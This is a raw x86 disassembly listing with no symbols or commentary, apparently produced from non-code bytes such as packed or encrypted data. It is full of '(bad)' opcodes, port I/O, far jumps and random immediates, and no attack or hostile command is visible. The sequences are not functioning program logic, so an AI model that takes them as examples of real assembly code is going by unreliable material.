  42a4ff:	in     al,0xf4
  42a501:	fmul   DWORD PTR [edi]
  42a503:	in     al,0xb2
  42a505:	int3   
  42a506:	(bad)  
  42a507:	int    0xad
  42a509:	in     eax,0xee
  42a50b:	test   al,0xf1
  42a50d:	shl    BYTE PTR [eax-0x31431329],1
  42a513:	sar    BYTE PTR [edx-0x608f929],cl
  42a519:	add    eax,edx
  42a51b:	jmp    0xdfe6:0xebdad5d1
  42a522:	in     al,0xfc
  42a524:	out    0xcf,al
  42a526:	loopne 0x42a4ed
  42a528:	loop   0x42a510
  42a52a:	(bad)  
  42a52b:	lds    esi,FWORD PTR [eax+edx*8-0x120d2e33]
  42a532:	enter  0xccd5,0xe3
  42a536:	loope  0x42a538
  42a538:	out    0x1,al
  42a53a:	shl    al,cl
  42a53c:	cld    
  42a53d:	out    0xe0,al
  42a53f:	in     al,0xc6
  42a541:	or     eax,DWORD PTR [ecx]
  42a543:	clc    
  42a544:	icebp  
  42a545:	repz out dx,al
  42a547:	mov    ebp,0xbaf4e0ad
  42a54c:	cmc    
  42a54d:	lock lds esi,FWORD PTR [eax-0x2f424b18]
  42a554:	shl    cl,cl
  42a556:	int3   
  42a557:	(bad)  
  42a558:	(bad)  
  42a55a:	shl    edi,0xc3
  42a55d:	fcmovu st,st(5)
  42a55f:	jmp    0xda0d8564
  42a564:	jecxz  0x42a532
  42a566:	icebp  
  42a567:	shr    BYTE PTR [esi-0x2f1b4a56],1
  42a56d:	in     eax,dx
  42a56e:	(bad)  
  42a56f:	cli    
  42a570:	fcmovnbe st,st(7)
  42a572:	mov    esi,0xb8e7f2fb
  42a577:	ret    0x3d3
  42a57a:	sar    dl,cl
  42a57c:	mov    edi,0xddd40105
  42a581:	or     BYTE PTR [eax],al
  42a583:	in     al,dx
  42a584:	stos   DWORD PTR es:[edi],eax
  42a585:	mov    dl,0xd3
  42a587:	in     al,0xe9
  42a589:	retf   0xece2
  42a58c:	icebp  
  42a58d:	mov    dh,0xf9
  42a58f:	mov    edx,0xfaeed7ec
  42a594:	cld    
  42a595:	cld    
  42a596:	clc    
  42a597:	in     eax,dx
  42a598:	add    eax,0x5e7bcd0
  42a59d:	leave  
  42a59e:	cld    
  42a59f:	(bad)  
  42a5a1:	repz std 
  42a5a3:	add    ch,dl
  42a5a5:	shl    ch,cl
  42a5a7:	leave  
  42a5a8:	enter  0xf2c2,0xdb
  42a5ac:	(bad)  
  42a5ad:	out    0xde,al
  42a5af:	mov    esi,0xdefbc4bd
  42a5b4:	int    0xfe
  42a5b6:	int3   
  42a5b7:	add    eax,0xe5dedfec
  42a5bc:	loopne 0x42a57f
  42a5be:	stc    
  42a5bf:	out    dx,eax
  42a5c0:	out    dx,eax
  42a5c1:	(bad)  
  42a5c2:	repz out 0xe3,eax
  42a5c5:	loop   0x42a5bd
  42a5c7:	aad    0xcc
  42a5c9:	jmp    0xf0f8:0xcababbe5
  42a5d0:	aad    0xf9
  42a5d2:	add    bh,ah
  42a5d4:	add    dh,ch
  42a5d6:	jecxz  0x42a5bd
  42a5d8:	clc    
  42a5d9:	(bad)  
  42a5db:	fcomip st,st(5)
  42a5dd:	(bad)  
  42a5de:	mov    ebp,0xc9cff4c8
  42a5e3:	fcmovb st,st(7)
  42a5e5:	mov    esp,0xd5d5f7ee
  42a5ea:	mov    bl,0xc4
  42a5ec:	enter  0xbad4,0xd6
  42a5f0:	fcomp  st(5)
  42a5f2:	hlt    
  42a5f3:	mov    ah,0xc8
  42a5f5:	lock pop es
  42a5f7:	rcr    ch,cl
  42a5f9:	sti    
  42a5fa:	in     al,0xcb
  42a5fc:	mov    edi,0xfbe0e4fc
  42a601:	les    eax,FWORD PTR [edi]
  42a603:	loopne 0x42a5ec
  42a605:	faddp  st(1),st
  42a607:	ror    al,1
  42a609:	out    dx,eax
  42a60a:	ret    0xf1d9
  42a60d:	out    dx,eax
  42a60e:	lods   eax,DWORD PTR ds:[esi]
  42a60f:	clc    
  42a610:	retf   
  42a611:	std    
  42a612:	dec    cl
  42a614:	xlat   BYTE PTR ds:[ebx]
  42a615:	rcl    ebx,cl
  42a617:	push   es
  42a618:	sti    
  42a619:	jmp    0x42a5ec
  42a61b:	icebp  
  42a61c:	aad    0xf4
  42a61e:	in     al,0xfb
  42a620:	add    eax,0xdf0cfffc
  42a625:	ror    esi,cl
  42a627:	mov    bl,0xea
  42a629:	mov    cl,0xcc
  42a62b:	jmp    0x42a606
  42a62d:	retf   
  42a62e:	call   0xe2ff92fc
  42a633:	jmp    0xfa3a7526
  42a638:	add    eax,0xd1ebe3dd
  42a63d:	enter  0xcaeb,0xff
  42a641:	call   0xcf0f7928
  42a646:	leave  
  42a647:	fnsave [esi-0x1348304e]
  42a64d:	hlt    
  42a64e:	retf   0xf8f3
  42a651:	mov    ch,0xdf
  42a653:	(bad)  
  42a655:	int    0xdb
  42a657:	in     eax,0xdd
  42a659:	stc    
  42a65a:	clc    
  42a65b:	out    0xf4,al
  42a65d:	std    
  42a65e:	push   es
  42a65f:	push   es
  42a660:	clc    
  42a661:	hlt    
  42a662:	loop   0x42a64f
  42a664:	out    dx,eax
  42a665:	mov    esp,0xadf6caa5
  42a66a:	lock (bad) 
  42a66c:	leave  
  42a66d:	icebp  
  42a66e:	repnz mov esi,0xdbbdf0db
  42a674:	xlat   BYTE PTR ds:[ebx]
  42a675:	icebp  
  42a676:	mov    esp,0xd1c6def1
  42a67b:	fild   WORD PTR [edx]
  42a67d:	call   0xea0c705e
  42a682:	fucomip st,st(0)
  42a684:	ret    
  42a685:	mov    eax,0xdceeeaed
  42a68a:	(bad)  
  42a68b:	shl    DWORD PTR [ebx-0x17024952],cl
  42a691:	out    dx,al
  42a692:	add    eax,DWORD PTR [ecx]
  42a694:	cld    
  42a695:	jecxz  0x42a66e
  42a697:	(bad)  
  42a699:	pop    es
  42a69a:	ret    
  42a69b:	shl    ch,0x4
  42a69e:	in     al,0x6
  42a6a0:	(bad)  
  42a6a2:	in     al,0xd2
  42a6a4:	out    dx,eax
  42a6a5:	rcr    dh,0xb6
  42a6a8:	shr    DWORD PTR [esi-0x301b5311],cl
  42a6ae:	aad    0xf5
  42a6b0:	int    0xd3
  42a6b2:	hlt    
  42a6b3:	mov    ah,0xf2
  42a6b5:	std    
  42a6b6:	mov    ebp,0xc2e2e1c1
  42a6bb:	or     al,ch
  42a6bd:	ror    ecx,0xc0
  42a6c0:	add    eax,0xf2eac5df
  42a6c5:	fucomp st(0)
  42a6c7:	out    dx,al
  42a6c8:	retf   
  42a6c9:	aam    0xf3
  42a6cb:	jmp    0x42a6c4
  42a6cd:	(bad)  
  42a6ce:	cli    
  42a6cf:	repz idiv edi
  42a6d2:	cmc    
  42a6d3:	rol    dl,cl
  42a6d5:	fadd   st,st(2)
  42a6d7:	mov    ch,0xba
  42a6da:	loope  0x42a6b1
  42a6dc:	aad    0x6
  42a6de:	hlt    
  42a6df:	in     eax,0xeb
  42a6e1:	add    BYTE PTR [edx],cl
  42a6e3:	add    cl,ah
  42a6e5:	jmp    0xe7e7:0xd6d2dda8
  42a6ec:	scas   eax,DWORD PTR es:[edi]
  42a6ed:	hlt    
  42a6ee:	xlat   BYTE PTR ds:[ebx]
  42a6ef:	rcl    ebp,cl
  42a6f1:	idiv   DWORD PTR [ebx-0x22134702]
  42a6f7:	cld    
  42a6f8:	stc    
  42a6f9:	pop    es
  42a6fa:	out    0xf0,eax
  42a6fc:	or     esp,esi
  42a6fe:	loop   0x42a6de
  42a700:	out    0xdf,al
  42a702:	sar    eax,0xb8
  42a705:	lods   al,BYTE PTR ds:[esi]
  42a706:	into   
  42a707:	shl    DWORD PTR [ebp-0x3e281113],cl
  42a70d:	(bad)  
  42a70e:	retf   0xd3fe
  42a711:	dec    ebp
  42a713:	lock out dx,eax
  42a715:	ffree  st(2)
  42a717:	add    ecx,ebp
  42a719:	rcl    esi,cl
  42a71b:	(bad)  
  42a71c:	sti    
  42a71d:	aam    0xee
  42a71f:	loope  0x42a70a
  42a721:	lar    edi,dx
  42a724:	test   al,0xca
  42a726:	enter  0xe4e2,0xc7
  42a72a:	ret    
  42a72b:	mov    bl,0xfb
  42a72d:	rol    esi,cl
  42a72f:	call   edi
  42a731:	mov    eax,0xdae3d5f3
  42a736:	(bad)  
  42a738:	mov    esp,0xf5eae3c5
  42a73d:	fcmovu st,st(5)
  42a73f:	hlt    
  42a740:	sti    
  42a741:	in     al,0x1
  42a743:	(bad)  
  42a745:	retf   0xadea
  42a748:	enter  0xcae0,0xc9
  42a74c:	rol    eax,0xca
  42a74f:	mov    bh,0xb4
  42a751:	(bad)  
  42a753:	hlt    
  42a754:	int3   
  42a755:	in     eax,dx
  42a756:	fst    st(5)
  42a758:	ror    BYTE PTR [ebx],0xe5
  42a75b:	jmp    0xe10b:0xe5f7ebf5
  42a762:	cli    
  42a763:	jmp    0xf2f3:0xc9d0cee5
  42a76a:	aam    0xc1
  42a76c:	(bad)  
  42a76d:	leave  
  42a76e:	iret   
  42a76f:	fcmovbe st,st(7)
  42a771:	retf   
  42a772:	mov    esp,0xb5dcb9ca
  42a777:	cli    
  42a778:	rcr    al,cl
  42a77a:	hlt    
  42a77b:	repnz or ah,al
  42a77e:	aam    0xca
  42a780:	fcomi  st,st(4)
  42a782:	in     al,dx
  42a783:	clc    
  42a784:	in     al,0xe5
  42a786:	loopne 0x42a74d
  42a788:	enter  0xd0ed,0xc5
  42a78c:	retf   0xf2b8
  42a78f:	iret   
  42a790:	enter  0xebcc,0xec
  42a794:	loop   0x42a754
  42a796:	icebp  
  42a797:	fcom   st(3)
  42a799:	in     eax,0xbc
  42a79b:	pop    es
  42a79c:	or     esi,ebp
  42a79e:	cli    
  42a79f:	or     ebx,edi
  42a7a1:	loop   0x42a79d
  42a7a3:	pop    es
  42a7a4:	mov    bl,0xec
  42a7a6:	fst    st(5)
  42a7a8:	mov    bh,0xb1
  42a7aa:	retf   
  42a7ab:	in     al,0xc5
  42a7ad:	cmc    
  42a7ae:	aad    0xf7
  42a7b0:	repnz in al,dx
  42a7b2:	sti    
  42a7b3:	(bad)  
  42a7b4:	(bad)  
  42a7b6:	mov    esp,0xf4d9c5cc
  42a7bb:	sar    cl,1
  42a7bd:	or     edi,ebx
  42a7bf:	mul    al
  42a7c1:	jecxz  0x42a7b1
  42a7c3:	stc    
  42a7c4:	repnz out dx,eax
  42a7c6:	mov    esi,0xfbade1e1
  42a7cb:	sti    
  42a7cc:	aad    0xb0
  42a7ce:	mov    edi,0xd6b9decd
  42a7d3:	icebp  
  42a7d4:	(bad)  
  42a7d5:	dec    ebp
  42a7d7:	fcomip st,st(5)
  42a7d9:	jmp    0x42a7a6
  42a7db:	cld    
  42a7dc:	ret    0xf4fb
  42a7df:	loop   0x42a7b6
  42a7e1:	jmp    0xb330b1df
  42a7e6:	(bad)
  42a7e9:	fcmovnu st,st(2)
  42a7eb:	cmc    
  42a7ec:	retf   
  42a7ed:	out    dx,al
  42a7ee:	sti    
  42a7ef:	mov    dh,0xb6
  42a7f1:	jmp    0xe0417ae6
  42a7f6:	mov    ebp,0xffd1bede
  42a7fb:	(bad)  
  42a7fc:	cld    
  42a7fd:	enter  0xd5fb,0xe4
  42a801:	(bad)  
  42a803:	out    0xef,al
  42a805:	in     eax,0xe0
  42a807:	mov    ebp,0xcef3cec2
  42a80c:	aad    0xd8
  42a80e:	int    0xdf
  42a810:	rcl    al,cl
  42a812:	jmp    0xd933a210
  42a817:	out    0xf8,al
  42a819:	aad    0xd0
  42a81b:	shl    esp,0xeb
  42a81e:	retf   0xcae6
  42a821:	fsqrt  
  42a823:	add    ecx,edx
  42a825:	(bad)  
  42a826:	in     al,0xb6
  42a828:	mov    dh,0xc6
  42a82a:	shl    BYTE PTR [edx-0x37341514],0xc8
  42a831:	fiadd  WORD PTR [edx]
  42a833:	(bad)  
  42a835:	add    ebx,edx
  42a837:	sar    DWORD PTR [esi-0xa1e1f02],cl
  42a83d:	or     cl,BYTE PTR [esi]
  42a83f:	fcom   st(4)
  42a841:	(bad)  
  42a842:	stc    
  42a843:	or     dh,al
  42a845:	in     al,0xac
  42a847:	loopne 0x42a83b
  42a849:	hlt    
  42a84a:	mov    dl,0xb6
  42a84c:	(bad)  
  42a84d:	loopne 0x42a81f
  42a84f:	in     al,0xd7
  42a851:	(bad)  
  42a853:	into   
  42a854:	aam    0x7
  42a856:	hlt    
  42a857:	loopne 0x42a816
  42a859:	(bad)  
  42a85b:	rol    BYTE PTR [esi],0xc1
  42a85e:	fdivr  st,st(3)
  42a860:	jmp    0x42a85b
  42a862:	(bad)  
  42a864:	shl    bh,0xee
  42a867:	mov    al,0xc8
  42a869:	(bad)
  42a86c:	mov    dl,0xe5
  42a86e:	sti    
  42a86f:	mov    eax,0xd1b9effd
  42a874:	mov    bh,0xdd
  42a876:	not    edi
  42a878:	int3   
  42a879:	or     esi,eax
  42a87b:	jmp    0xc607aa77
  42a880:	add    al,0xf3
  42a882:	clc    
  42a883:	adc    al,bh
  42a885:	mov    edi,0xecefe8d2
  42a88a:	(bad)  
  42a88b:	out    dx,eax
  42a88c:	mov    dl,0xef
  42a88e:	aad    0xbb
  42a890:	clc    
  42a891:	enter  0xeefb,0xbd
  42a895:	rcl    edx,0xc7
  42a898:	pop    es
  42a899:	push   es
  42a89a:	ret    0xf5f5
  42a89d:	add    eax,0x8dde3de
  42a8a2:	adc    al,BYTE PTR ds:0xe3c9e3bc
  42a8a8:	scas   al,BYTE PTR es:[edi]
  42a8a9:	(bad)  
  42a8aa:	retf   
  42a8ab:	xlat   BYTE PTR ds:[ebx]
  42a8ac:	leave  
  42a8ad:	mov    ecx,0xf1bfcbfe
  42a8b2:	(bad)  
  42a8b4:	fdivrp st(7),st
  42a8b6:	aam    0xd4
  42a8b8:	rcr    ch,cl
  42a8ba:	(bad)  
  42a8bb:	fild   WORD PTR [ebx]
  42a8bd:	fxch   st(2)
  42a8bf:	fld    QWORD PTR [ecx]
  42a8c1:	dec    DWORD PTR [edx]
  42a8c3:	cli    
  42a8c4:	shr    BYTE PTR [esi-0x3d2f5713],1
  42a8ca:	(bad)  
  42a8cb:	jmp    0xd5365fb9
  42a8d0:	lds    esi,FWORD PTR [ebp-0x9ff2e4f]
  42a8d6:	mov    eax,0x6f201c6
  42a8db:	(bad)  
  42a8dc:	stc    
  42a8dd:	add    BYTE PTR [edi],cl
  42a8df:	fstp   st(3)
  42a8e1:	fsincos 
  42a8e3:	or     DWORD PTR [eax-0x1e520931],edi
  42a8e9:	(bad)  
  42a8ea:	loope  0x42a8a3
  42a8ec:	loope  0x42a8e2
  42a8ee:	(bad)  
  42a8ef:	(bad)  
  42a8f0:	retf   
  42a8f1:	stc    
  42a8f2:	in     eax,dx
  42a8f3:	sar    ebx,cl
  42a8f5:	int    0xf6
  42a8f7:	int    0xfc
  42a8f9:	(bad)  
  42a8fa:	loop   0x42a8e5
  42a8fc:	in     al,0xd5
  42a8fe:	out    0xfa,eax
  42a900:	push   es
  42a901:	in     eax,0xee
  42a903:	loop   0x42a8ce
  42a905:	mov    esp,0xcbf4c2b7
  42a90a:	in     eax,0xd9
  42a90c:	cmc    
  42a90d:	int    0xe5
  42a90f:	mov    esi,0xf2bbc4e8
  42a914:	aam    0xfa
  42a916:	pop    es
  42a917:	in     eax,dx
  42a918:	(bad)  
  42a919:	rol    ah,cl
  42a91b:	mov    esp,0xeae8d7dd
  42a920:	push   es
  42a921:	int    0xf9
  42a923:	stc    
  42a924:	(bad)  
  42a925:	int    0xcf
  42a927:	ret    
  42a928:	enter  0xd2ca,0xb3
  42a92c:	scas   eax,DWORD PTR es:[edi]
  42a92d:	hlt    
  42a92e:	into   
  42a92f:	std    
  42a930:	sti    
  42a931:	fiadd  WORD PTR [edx]
  42a933:	jecxz  0x42a908
  42a935:	mov    edx,0xe0ff02dd
  42a93a:	inc    BYTE PTR [ebx]
  42a93c:	cmc    
  42a93d:	(bad)  
  42a93f:	aam    0xe2
  42a941:	(bad)  
  42a942:	out    0xde,al
  42a944:	(bad)
  42a947:	in     al,dx
  42a948:	mov    dl,0xd5
  42a94a:	(bad)
  42a94d:	leave  
  42a94e:	mov    ebx,0xbef2ecb8
  42a953:	repz mov bh,0xda
  42a956:	lock into 
  42a958:	rol    DWORD PTR [ecx],1
  42a95a:	(bad)  
  42a95c:	mov    edx,0xf9f9f9fa
  42a962:	into   
  42a963:	jmp    0xd5eb8126
  42a968:	mov    bh,0xae
  42a96a:	shr    BYTE PTR [ebx+esi*8-0x2d4f470d],0xb6
  42a972:	hlt    
  42a973:	cld    
  42a974:	int    0xf8
  42a976:	repnz (bad) 
  42a978:	inc    BYTE PTR [edi+edx*8]
  42a97b:	(bad)  
  42a97c:	fcmovbe st,st(7)
  42a97e:	enter  0xe8c9,0xeb
  42a982:	cld    
  42a983:	fldcw  WORD PTR [edx-0xa144141]
  42a989:	stos   BYTE PTR es:[edi],al
  42a98a:	loope  0x42a974
  42a98c:	ror    esi,1
  42a98e:	fdiv   st,st(7)
  42a990:	in     eax,0xe9
  42a992:	mov    ah,0xf0
  42a994:	test   BYTE PTR [edi],0xf5
  42a997:	div    ebp
  42a999:	add    al,dh
  42a99b:	out    0xd0,al
  42a99d:	fxtract 
  42a99f:	std    
  42a9a0:	int    0xeb
  42a9a2:	adc    cl,ch
  42a9a4:	mov    ebp,0xecdde6c7
  42a9a9:	out    0xb1,eax
  42a9ab:	icebp  
  42a9ac:	cmc    
  42a9ad:	into   
  42a9ae:	mul    dh
  42a9b0:	xlat   BYTE PTR ds:[ebx]
  42a9b1:	fcmovnbe st,st(7)
  42a9b3:	(bad)  
  42a9b5:	mov    edi,0x2d1f2bf
  42a9ba:	jecxz  0x42a987
  42a9bc:	(bad)  
  42a9be:	add    al,0xd8
  42a9c0:	aad    0xe8
  42a9c2:	jmp    0x42a9c4
  42a9c4:	shl    BYTE PTR [esi-0x4e311f50],0xb7
  42a9cb:	out    0xfa,eax
  42a9cd:	int    0xc5
  42a9cf:	in     al,dx
  42a9d0:	fbstp  TBYTE PTR [edx-0xcff0b37]
  42a9d6:	add    eax,esi
  42a9d8:	add    dl,cl
  42a9da:	add    al,0xfe
  42a9dc:	jmp    0xdfe8:0x2e1bdfb
  42a9e3:	adc    ebx,ebp
  42a9e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a9e6:	fsubr  QWORD PTR [esi-0xd0a3e0c]
  42a9ec:	mov    al,0xc6
  42a9ee:	out    0xcb,eax
  42a9f0:	(bad)  
  42a9f1:	out    dx,al
  42a9f2:	add    bh,BYTE PTR [ebx-0x5402b47]
  42a9f8:	rcr    edi,0x5
  42a9fb:	aam    0xf8
  42a9fd:	add    bl,ch
  42a9ff:	hlt    
  42aa00:	fsubr  st,st(1)
  42aa02:	enter  0xcede,0xc4
  42aa06:	out    0xc4,al
  42aa08:	jecxz  0x42a9ec
  42aa0a:	(bad)  
  42aa0b:	in     eax,0xf3
  42aa0d:	fcmovu st,st(7)
  42aa0f:	enter  0xcded,0xd4
  42aa13:	fdiv   st(2),st
  42aa15:	mov    ebp,0xfce5d7e3
  42aa1a:	ret    0xc9db
  42aa1d:	sti    
  42aa1e:	or     ebp,edi
  42aa20:	in     al,dx
  42aa21:	cld    
  42aa22:	shl    edx,0xad
  42aa25:	fucomip st,st(0)
  42aa27:	rol    al,1
  42aa29:	out    0xf3,eax
  42aa2b:	sti    
  42aa2c:	out    dx,al
  42aa2d:	scas   al,BYTE PTR es:[edi]
  42aa2e:	jmp    0xba3e61eb
  42aa33:	stc    
  42aa34:	repz iret 
  42aa36:	(bad)  
  42aa37:	in     eax,dx
  42aa38:	(bad)  
  42aa39:	mov    esp,0xc005e6e6
  42aa3e:	xlat   BYTE PTR ds:[ebx]
  42aa3f:	fsubrp st(4),st
  42aa41:	add    ecx,DWORD PTR [edx+ecx*1]
  42aa44:	fidivr WORD PTR [ebp-0x4c17330f]
  42aa4a:	call   0xba1d91f7
  42aa4f:	mov    ah,0xde
  42aa51:	fucomip st,st(4)
  42aa53:	mov    ecx,0xf7faf4dc
  42aa58:	(bad)  
  42aa5a:	sar    dl,0xf8
  42aa5d:	jecxz  0x42aa62
  42aa5f:	or     esp,edi
  42aa61:	jmp    0xcfea:0xf7b2cdeb
  42aa68:	ret    0xe9e3
  42aa6b:	retf   0xb7b2
  42aa6e:	clc    
  42aa6f:	(bad)  
  42aa70:	cld    
  42aa71:	leave  
  42aa72:	fdivr  QWORD PTR [edi-0x391c1829]
  42aa78:	add    dl,al
  42aa7a:	add    ch,bl
  42aa7c:	cmc    
  42aa7d:	jmp    0xcd0d:0xefdad407
  42aa84:	in     al,dx
  42aa85:	fdiv   QWORD PTR [edi-0x4b0a5034]
  42aa8b:	retf   
  42aa8c:	repz fxch st(6)
  42aa8f:	out    0xd3,al
  42aa91:	mov    dh,0xf2
  42aa93:	fsqrt  
  42aa95:	(bad)  
  42aa97:	sar    cl,0xc0
  42aa9a:	retf   
  42aa9b:	add    eax,0x5f5f6c2
  42aaa0:	push   es
  42aaa1:	fcomp  st(1)
  42aaa3:	(bad)  
  42aaa5:	ret    0xc7b3
  42aaa8:	in     eax,dx
  42aaa9:	ret    
  42aaaa:	shl    ecx,1
  42aaac:	retf   
  42aaad:	vpsrld xmm5,xmm6,xmm4
  42aab1:	mov    edi,0xc3e002d9
  42aab6:	(bad)  
  42aab7:	(bad)  
  42aab8:	ftst   
  42aaba:	fucomip st,st(1)
  42aabc:	(bad)  
  42aabe:	out    dx,eax
  42aabf:	cli    
  42aac0:	out    dx,eax
  42aac1:	or     cl,ch
  42aac3:	in     eax,0xc6
  42aac5:	leave  
  42aac6:	loop   0x42aabf
  42aac8:	rcr    ebx,1
  42aaca:	aad    0xf5
  42aacc:	div    DWORD PTR [eax-0xb13244f]
  42aad2:	(bad)  
  42aad4:	enter  0xfaf6,0xff
  42aad8:	fcomp  st(6)
  42aada:	sar    esp,1
  42aadc:	fcos   
  42aade:	out    0xe3,eax
  42aae0:	(bad)  
  42aae2:	or     eax,0xafcbb8cf
  42aae7:	out    0xee,eax
  42aae9:	shl    eax,1
  42aaeb:	call   0xfb2e76aa
  42aaf0:	repz mov ebp,0xbdfad6db
  42aaf6:	fstp   st(0)
  42aaf8:	loopne 0x42aae1
  42aafa:	aam    0xc1
  42aafc:	(bad)  
  42aafd:	(bad)  
  42aaff:	fucomi st,st(0)
  42ab01:	add    al,0xc1
  42ab03:	in     eax,0xa8
  42ab05:	ret    0xc2c4
  42ab08:	(bad)
  42ab0b:	int    0xe9
  42ab0d:	repnz out dx,eax
  42ab0f:	rcl    esp,cl
  42ab11:	mov    eax,0x1bdeffe
  42ab16:	rcl    edx,cl
  42ab18:	push   es
  42ab19:	add    edx,ebp
  42ab1b:	add    ebp,eax
  42ab1d:	or     ebx,esi
  42ab1f:	push   cs
  42ab20:	or     ebp,eax
  42ab22:	call   0xcfe99e18
  42ab27:	(bad)  
  42ab28:	repz aad 0xe6
  42ab2b:	retf   0xffaf
  42ab2e:	enter  0xf7b5,0xdf
  42ab32:	lock add dh,al
  42ab35:	fnstsw WORD PTR [esi-0x343ffc1e]
  42ab3b:	fcmovnb st,st(4)
  42ab3d:	in     al,0xde
  42ab3f:	push   es
  42ab40:	iret   
  42ab41:	into   
  42ab42:	add    bh,ch
  42ab44:	fcomp  st(0)
  42ab46:	fsub   st(0),st
  42ab48:	lods   al,BYTE PTR ds:[esi]
  42ab49:	mov    ah,0xb4
  42ab4b:	aad    0xfa
  42ab4d:	jmp    0xdd0c9819
  42ab52:	mov    esi,0xfcc1bcbe
  42ab57:	add    ch,cl
  42ab59:	in     al,0xbc
  42ab5b:	fxam   
  42ab5d:	mov    ebp,0x906e5ce
  42ab63:	fdivr  DWORD PTR [ecx+ecx*8-0x354a3430]
  42ab6a:	(bad)  
  42ab6b:	in     eax,dx
  42ab6c:	les    esi,FWORD PTR [eax-0x2490807]
  42ab72:	jmp    edx
  42ab74:	add    bl,bl
  42ab76:	(bad)  
  42ab77:	mov    esi,0x5c3fdbe
  42ab7c:	leave  
  42ab7d:	or     eax,DWORD PTR [eax]
  42ab7f:	aad    0xec
  42ab81:	or     ebp,ebx
  42ab83:	add    DWORD PTR [ecx-0x8524116],esi
  42ab89:	mov    ah,0xc6
  42ab8b:	out    dx,eax
  42ab8c:	clc    
  42ab8d:	sti    
  42ab8e:	test   dl,0xf3
  42ab91:	out    dx,eax
  42ab92:	std    
  42ab93:	mov    eax,0xb8c1e3fe
  42ab98:	mul    ch
  42ab9a:	add    BYTE PTR [esp+eax*1],al
  42ab9d:	add    cl,bh
  42ab9f:	(bad)  
  42aba1:	in     eax,dx
  42aba2:	out    0x7,al
  42aba4:	out    0xd0,al
  42aba6:	retf   0xf3b0
  42aba9:	rcl    esp,cl
  42abab:	mov    ah,0xf2
  42abad:	shr    al,0xf9
  42abb0:	aam    0xd2
  42abb2:	jmp    0xdd44986b
  42abb7:	cli    
  42abb8:	fcmovnbe st,st(3)
  42abba:	(bad)  
  42abbb:	std    
  42abbc:	loope  0x42ab86
  42abbe:	(bad)  
  42abbf:	clc    
  42abc0:	jmp    0x42abc4
  42abc2:	out    dx,al
  42abc3:	repz into 
  42abc5:	in     al,dx
  42abc6:	mov    edi,0xc1bcc5c0
  42abcb:	into   
  42abcc:	sti    
  42abcd:	out    0xea,eax
  42abcf:	xlat   BYTE PTR ds:[ebx]
  42abd0:	jmp    0x1f2:0xc2eabefa
  42abd7:	cli    
  42abd8:	add    al,0xd7
  42abda:	add    esp,esp
  42abdc:	out    0xa,eax
  42abde:	retf   
  42abdf:	fcmovb st,st(4)
  42abe1:	(bad)  
  42abe3:	in     eax,dx
  42abe4:	out    dx,al
  42abe5:	(bad)
  42abe8:	div    BYTE PTR [ebx-0x100c1f32]
  42abee:	in     eax,dx
  42abef:	fucomip st,st(4)
  42abf1:	mov    ebx,0xcdeed5e2
  42abf6:	sar    bh,cl
  42abf8:	rcl    cl,0xbd
  42abfb:	jmp    0x42abbe
  42abfd:	add    al,0xca
  42abff:	jecxz  0x42ac00
  42ac01:	in     al,dx
  42ac02:	std    
  42ac03:	ffree  st(5)
  42ac05:	fsub   st(5),st
  42ac07:	lock mov esp,0xb1b6f6e8
  42ac0d:	out    dx,al
  42ac0e:	mov    cl,0xb8
  42ac10:	rcr    dh,cl
  42ac12:	retf   
  42ac13:	repz fsubr st,st(0)
  42ac16:	neg    eax
  42ac18:	shl    dh,cl
  42ac1a:	icebp  
  42ac1b:	or     cl,BYTE PTR [ecx]
  42ac1d:	retf   
  42ac1e:	(bad)  
  42ac1f:	fsubr  st(5),st
  42ac21:	fmul   st(1),st
  42ac23:	or     edi,ecx
  42ac25:	mov    edi,0xe2e3c7cb
  42ac2a:	int3   
  42ac2b:	mov    bl,0xc1
  42ac2d:	mov    al,0xcb
  42ac2f:	in     al,dx
  42ac30:	aad    0xee
  42ac32:	jmp    0x42ac37
  42ac34:	stc    
  42ac35:	out    0x3,eax
  42ac37:	fsub   st,st(1)
  42ac39:	icebp  
  42ac3a:	loope  0x42ac42
  42ac3c:	xlat   BYTE PTR ds:[ebx]
  42ac3d:	enter  0xfdcb,0xec
  42ac41:	fist   WORD PTR [edx]
  42ac43:	or     ecx,edx
  42ac45:	shl    BYTE PTR [ebx-0x484d0a16],1
  42ac4b:	test   al,0xe7
  42ac4d:	mov    ecx,0xf8b7c9eb
  42ac52:	aam    0xce
  42ac54:	idiv   bh
  42ac56:	fiadd  DWORD PTR [edx]
  42ac58:	in     al,dx
  42ac59:	repz test DWORD PTR [ebx],0xd9fad7fe
  42ac60:	add    eax,0xe6e0ec00
  42ac65:	loopne 0x42ac4f
  42ac67:	leave  
  42ac68:	(bad)  
  42ac69:	aam    0xc5
  42ac6b:	shl    edi,cl
  42ac6d:	icebp  
  42ac6e:	out    0xe6,eax
  42ac70:	mov    esi,0xffccddce
  42ac75:	ror    edi,cl
  42ac77:	faddp  st(5),st
  42ac79:	sti    
  42ac7a:	stc    
  42ac7b:	sti    
  42ac7c:	cld    
  42ac7d:	cli    
  42ac7e:	jmp    0xc8cc:0xe1e8dcef
  42ac85:	jmp    0xf4d3:0xb6aed6b3
  42ac8c:	loopne 0x42ac84
  42ac8e:	sar    DWORD PTR [esi-0x2103252b],cl
  42ac94:	aad    0xf8
  42ac96:	ret    
  42ac97:	shl    esi,0xb
  42ac9a:	(bad)  
  42ac9b:	jmp    ecx
  42ac9d:	retf   
  42ac9e:	imul   ebp
  42aca0:	stc    
  42aca1:	in     eax,dx
  42aca2:	(bad)  
  42aca4:	lock mov edi,0xcdf4d0c4
  42acaa:	ror    bh,cl
  42acac:	out    dx,eax
  42acad:	(bad)  
  42acb0:	enter  0xedeb,0xff
  42acb4:	mov    edx,0xe4fb02d2
  42acb9:	out    0xf2,eax
  42acbb:	cli    
  42acbc:	add    esp,esi
  42acbe:	(bad)  
  42acbf:	(bad)  
  42acc1:	in     al,0xe0
  42acc3:	out    dx,eax
  42acc4:	(bad)  
  42acc5:	jmp    0x42acaa
  42acc7:	mov    bh,0xb7
  42acc9:	shl    BYTE PTR [edx-0xa111135],0xc8
  42acd0:	(bad)  
  42acd1:	mov    ebp,0xecbfd5f0
  42acd6:	ret    
  42acd7:	fadd   st,st(6)
  42acd9:	cmc    
  42acda:	push   es
  42acdb:	ret    
  42acdc:	call   0xdd1885d5
  42ace1:	or     al,BYTE PTR [edx]
  42ace3:	push   DWORD PTR [edx-0x2d2c513f]
  42ace9:	loopne 0x42acdb
  42aceb:	lock out 0xdb,eax
  42acee:	fdivr  DWORD PTR [ecx-0x1c4e4208]
  42acf4:	call   0xce34a4d9
  42acf9:	aad    0xff
  42acfb:	rol    BYTE PTR [ecx],0xb
